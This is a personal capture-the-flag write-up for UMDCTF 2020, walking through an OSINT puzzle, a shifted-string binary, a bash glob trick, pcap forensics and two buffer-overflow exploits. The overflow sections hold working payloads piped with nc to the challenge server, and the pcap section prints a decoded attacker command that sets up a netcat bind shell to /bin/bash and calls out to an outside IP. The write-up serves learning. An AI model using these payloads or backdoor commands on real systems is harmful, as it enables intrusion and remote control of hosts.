# UMDCTF

This is a quick repo I'm throwing together to attempt to capture some of my thoughts during the UMBCTF on 18APR2020.  I am a complete newbie when it comes to these things so don't expect to get a ton of wisdom from me.

## MemeCTF
I wish I was better at OSINT :(

9012389aad4eb9be53d225c4bbe72098ebdb37b97a52893171ff1bce0d40f383

I googled this hash which took me to the (UMD-CSEC github profile)[https://github.com/UMD-CSEC].  The repository only shows a single markdown document but the description has the hash so I know I'm in the right place.  I then noticed that there are 3 commits.  The second commit shows that a flag was added.  Clicking on the commit, I see that this commit has a binary file *.lol.jpg*.  I click Browse Files and the filename, I am shows a jpg that has the flag on it:  UMBDCTF-{meme_ch4llenges_ftw}

## Santa Mysterious Box
You're given an ELF binary called SantaBox.  The first thing I did was run *file* on it:

SantaBox: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0400ccb74c0271f1ee7ddbd3c1f022466338d6f5, stripped

Who says you can't execute random binaries off of the internet?

```
↳ $ ./SantaBox
-----------------------------------------
|                                       |
|                                       |
|                                       |
|           Santa's Mysterious          |
|             Box of Treats             |
|                                       |
|                                       |
|                                       |
|                                       |
|                                       |
-----------------------------------------
Enter code here: Secrets
You received coal!
```

Ok, so it needs a code.  I wonder if the string is visible so I run strings and can't see the telltale signs if UMDCTF.  I then run it through *ltrace* to see what functions its calling and something interesting jumps out.

```
__isoc99_scanf(0x55b41b261c7a, 0x7ffcb056f310, 0, 0Enter code here: abcdefghijklmnop
)                                             = 1
strcmp("\\]^_`abcdefghijk", "PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x")
```

I entered the code of **abcdefghijklmnop** and the strcmp shows **\\]^_`abcdefghijk**.  This is a sign the letters have all been shifted by the same amount.  Let me copy **PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x** into python and perform a subtraction of 5 and see what we come up with.

```python
>>> code = 'PH?>OA(vN/io/Zb<q.Zt+pZKm.io0x'
>>> ''.join((chr(ord(x)+5) for x in code))
'UMDCTF-{S4nt4_gAv3_y0u_Pr3nt5}'
```

## Question
To read or not to read the flag... That is the question!

nc 192.241.138.174 9999

For this one, you connect via netcat and the terminal has already presented you with the *cat* command having already been entered.  However, it seems as most other character are not allowed.  I gave it a couple of attempts and got lucky when I remembered reading about globing inside of bash during another CTF.

```
↳ $ nc 192.241.138.174 9999
The flag.txt is here. Try to read it!
> cat flag.txt
Nope!
> cat *
Nope!
> cat ????.???
UMDCTF-{s0me_questions_h4ve_answ3rs}
```

## Cowspeak as a Service
lumpus gave up installing cowspeak so he made it a remote service instead! Too bad it keeps overwriting old messages... Can you become chief cow and read the first message?

nc 192.241.138.174 9998

This one I struggled with for a bit.  Probably my first real struggle of the CTF.  Luckily the *main.c* file is provided and in it I noticed that use of *strcpy.

```
void moo(char *msg)
{
        char speak[64];
        int chief_cow = 1;

        strcpy(speak, msg);
        printf("Value of chief_cow: %d\n", chief_cow);
        speak[strcspn(speak, "\r\n")] = 0;
        setenv("MSG", speak, chief_cow);

        system("./cowsay $MSG");

}
```

I compiled the binary and played around with overflowing *speak* but couldn't seem to affect its call to cowsay.  I took a second to think about what it was that I was trying to accomplish.  I then honed in on the use of *setenv*. The man page for this function indicates:

```
int setenv(const char *name, const char *value, int overwrite);
...
if overwrite is zero, then the value of name is not changed
```

So, that's what I need to do.  I need to overflow and change the value of chief_cow to zero.  However, its not in the correct place on the stack where an overflow of speak can affect it.  That's when I realize that I didn't compile with **-fno-stack-protector** which is a must for most of these easier overflow problems.  I recompile and notice I can now adjust the value of chief_cow if I overflow.  I modify the *main.c* code to print out the value of *chief_cow* so that I can see its value as I attempt to exploit it.  I then put together a pretty crappy for loop to loop through and inspect the results.

```
for i in {64..80}; do echo $i; python -c "print('a'*"$i" + '\x00'*4)" | ./cow; done
```

Looking over the results I can see that 76 characters overflowed and updated the value of *chief_cow*.

```
76
Welcome to Cowsay as a Service (CaaS)!

Enter your message:

Value of chief_cow: 0
 _________________________________________
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \
\ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

I attempt this against the server:

```
↳ $ python -c "print('a'*76 + '\x00'*4)" | nc 192.241.138.174 9998
Welcome to Cowsay as a Service (CaaS)!

Enter your message:

 ________________________
< UMDCTF-{P5Th_Ov3rF10w} >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

## A Nation State Musical
Oh no! It looks like a nation state is trying to attack one of UMDs routers! Using a pcap generated from the attack, try to determine which nation state the attack is coming from.

Beware, you only have five guesses.

The flag will be in the format UMDCTF-{Country}

Note: do not attempt to communicate with or contact any of the IP addresses mentioned in the challenge. The challenge can and should be solved statically.

Attached was a pcap of roughly 5001 packets.  I opened it in *Wireshark* and noticed that the all of the packets seem to be nearly identical and all originate from the same place.  Looking up the address at (MXToolbox)[https://mxtoolbox.com/arin.aspx] said the IP came from the Ukraine however, that answer was not accepted.  Of course it couldn't be that easy.  I went packet to the packets and the only thing that seems to be changing among them is the TCP source port and the checksum.  I tried to discern a pattern but couldn't as it seemed the port numbers were all incremented by one and the checksums were decremented.  To be completely transparent, I mostly floundered in analyzing this and opened the pcap inside of *scapy* to analyze it.

```
>>> packets = rdpcap('attack.pcap')
>>> packets
<attack.pcap: TCP:5001 UDP:0 ICMP:0 Other:0>
```

Through dumb luck somewhere between *Wireshark* and *scapy*, I found a single packet that was larger than the rest so I extracted it and analyzed a bit.

```
>>> interesting = [pckt for pckt in packets if len(pckt) > 54]
interesting[0][Raw].load
b"\xff\xfe'\x00;\x00\n\x00r\x00m\x00 \x00-\x00f\x00 \x00b\x00a\x00c\x00k\x00d\x000\x000\x00r\x00\n\x00m\x00k\x00f\x00i\x00f\x00o\x00 \x00b\x00a\x00c\x00k\x00d\x000\x000\x00r\x00\n\x00n\x00c\x00 \x00-\x00l\x00k\x00 \x001\x003\x003\x007\x00 \x000\x00<\x00b\x00a\x00c\x00k\x00d\x000\x000\x00r\x00 \x00|\x00 \x00/\x00b\x00i\x00n\x00/\x00b\x00a\x00s\x00h\x00 \x001\x00>\x00b\x00a\x00c\x00k\x00d\x000\x000\x00\n\x00e\x00c\x00h\x00o\x00 \x00'\x00<\x045\x04=\x04 \x00:\x04V\x04@\x045\x04<\x04V\x04=\x04'\x00 \x00|\x00 \x00n\x00c\x00 \x003\x007\x00.\x004\x006\x00.\x009\x006\x00.\x000\x00 \x001\x003\x003\x007\x00"
```

I floundered for a bit bit but eventually was able to convert it:

```
>>> ''.join([chr(byte) for byte in interesting[0][Raw].load if byte >= 32 and byte <= 126])
"';rm -f backd00rmkfifo backd00rnc -lk 1337 0<backd00r | /bin/bash 1>backd00echo '<5= :V@5<V=' | nc 37.46.96.0 1337"
```

Now I have a different IP address to search: **37.46.96.0**.  This was an address block in **Kazakhstan** which turned out to be the answer.

After the fact, I also found that inside of *Wireshark*, you can do a Protocol Hierarchy Statistic and find that only one packet had actual data.  By right clicking the entry, you can apply data as a filter and analyze the packet from there.

## Jump Not Found
We are trying to make a hyper jump to Naboo, but our system doesn't know where Naboo is. Can you help us figure out the issue?

nc 192.241.138.174 9996

This challenge included a *JNF* ELF binary.  I went through the normal process of strings and ltrace and didn't come up with anything definitive.  I then decided to take a look at the code by running *objdump*.

```
objdump -D JNF > JNF.dump
```

Having run the program, I can see where you enter a number associated with the location, and it indicates you went there. However, there are no entries to indicate a jump to "Naboo".  However, in the dump, I can clearly see there is a function for *jumpToNaboo*:

```
000000000040070a <jumpToNaboo>:
  40070a:       55                      push   %rbp
  40070b:       48 89 e5                mov    %rsp,%rbp
  40070e:       bf 58 09 40 00          mov    $0x400958,%edi
  400713:       e8 68 fe ff ff          callq  400580 <puts@plt>
```

So this is the function we want to get called.  I make note of the address *000000000040070a* and this turns out to bite me in the butt (more on this later).  I then analyze how the other functions are being called.  Analyzing the code in main, I can see that the function addresses are being moved onto the stack:

```
  40075e:       48 89 45 f0             mov    %rax,-0x10(%rbp)
  400762:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  400766:       48 c7 00 d7 06 40 00    movq   $0x4006d7,(%rax)
  40076d:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  400771:       48 c7 40 08 e8 06 40    movq   $0x4006e8,0x8(%rax)
  400778:       00
  400779:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  40077d:       48 c7 40 10 f9 06 40    movq   $0x4006f9,0x10(%rax)
```

However, jumpToNaboo doesn't get added.  So then I look at how the input is being handled handled by *gets* which means I can cause an overflow of the stack and potentially change some addresses.

```
40079b:       e8 20 fe ff ff          callq  4005c0 <gets@plt>
```

Another function worth mentioning is *strtol* because that's what the input gets run through.

```
4007b3:       e8 f8 fd ff ff          callq  4005b0 <strtol@plt>
```

Looking over the man page for this function and I see:

```
string is converted to a long int value in the obvious manner, stopping at the first character which is not a valid digit
```

So I know if I feed it `2 SOME_GARBAGE` strtol will return a 2 but my garbage still got read in by the *gets*.  Perfect. After a series of jumps based on user input of what location they want to visit the function is called via:

```
  40082b:       48 8b 50 10             mov    0x10(%rax),%rdx
  40082f:       b8 00 00 00 00          mov    $0x0,%eax
  400834:       ff d2                   callq  *%rdx
```

So if I overflow the stack and update the memory addresses, those will get loaded into *rdx* and I will jump to that location.  I hop over to (Wiremask)[https://wiremask.eu/tools/buffer-overflow-pattern-generator/?] to generate a unique pattern.  I know there are various scripts out there to do this but I kinda like the simplicity of this site.  Anyway, I grab a 100 byte pattern and try it out inside of *GDB*.  As I'm stepping through main, when prompted, I enter `2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`.  It was an arbitrary decision to start with 2.  I then stepped down to right as it was about to `callq *%rdx` and checked to see what it holds.

```
(gdb) x/x $rdx
0x4130644139634138:     Cannot access memory at address 0x4130644139634138
```

I take 0x4130644139634138 and head back to (Wiremask)[https://wiremask.eu/tools/buffer-overflow-pattern-generator/?] and enter it for the register value. It tells me this is 86 bytes into the pattern.  So I now I need 86 byes of fluff plus the memory address of *jumpToNaboo* and I should be golden.  I build my pattern.  I floundered here quite a bit thinking I had an endianness issue with my address.  I fought for quite a bit of time trying to get the address set just right.  Out of frustration, I reached out to the designer of the problem and laid out everything I had done and he indicated I was very close but there was a small issue with my payload.  I went back to the drawing board and revisited everything ensuring I was converting everything correctly.  Consequently I found a nice way to convert my addresses to little endian and know that I did it right:

```
>>> from struct import pack
>>> rdx = 0x000000000040070a
>>> with open('naboo', 'wb') as f:
...     f.write('2 ' + 'a' * 86 + pack("<Q",rdx))
... 
```

```
↳ $ xxd naboo
00000000: 3220 6161 6161 6161 6161 6161 6161 6161  2 aaaaaaaaaaaaaa
00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000040: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000050: 6161 6161 6161 6161 0a07 4000 0000 0000  aaaaaaaa..@.....
```

However, this payload didn't seem to work....

```
↳ $ cat naboo | ./JNF
SYSTEM CONSOLE> Checking navigation...
Segmentation fault (core dumped)
```

So I floundered for a bit more until I finally realized the issue was the memory address I was trying to load.  The memory address contained the hex value **\x0a**.  This also happens to correspond to the *line feed* on the ASCII chart causing *fgets* to stop processing input after that point.  This means that I didn't overflow my entire address into *rdx*.  I went back to the *jumpToNaboo function and moved down to the point where the memory address of the flag gets moved into the *rdi* register.

```
  40070e:       bf 58 09 40 00          mov    $0x400958,%edi
  400713:       e8 68 fe ff ff          callq  400580 <puts@plt>
```

So I used *40070e* instead and rewrote the naboo file as before:

```
>>> rdx = 0x000000000040070e
>>> with open('naboo', 'wb') as f:
...     f.write('2 ' + 'a' * 86 + pack("<Q",rdx))
...
```

```
↳ $ xxd naboo
00000000: 3220 6161 6161 6161 6161 6161 6161 6161  2 aaaaaaaaaaaaaa
00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000040: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000050: 6161 6161 6161 6161 0e07 4000 0000 0000  aaaaaaaa..@.....
```

I attempted again with the binary:

```
↳ $ cat naboo | ./JNF
SYSTEM CONSOLE> Checking navigation...
Jumping to Naboo...
 UMDCTF-{ flag on server             }
Segmentation fault (core dumped)
```

Sweet success! Now lets try it against the server.

```
↳ $ cat naboo | nc 192.241.138.174 9996
SYSTEM CONSOLE>
```

What the heck man!  I know my payload works....  Hmmm...  Let me try a different way to deliver. Maybe *cat* is doing something weird.  Let me copy everything out and send it with *echo*.

```
↳ $ echo -e '2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x0e\x07\x40\x00\x00\x00\x00' | nc 192.241.138.174 9996
SYSTEM CONSOLE> Checking navigation...
Jumping to Naboo...
 UMDCTF-{S3tt1ng_C00rd1nat3s_T0_NaBOO}
```

Boom!
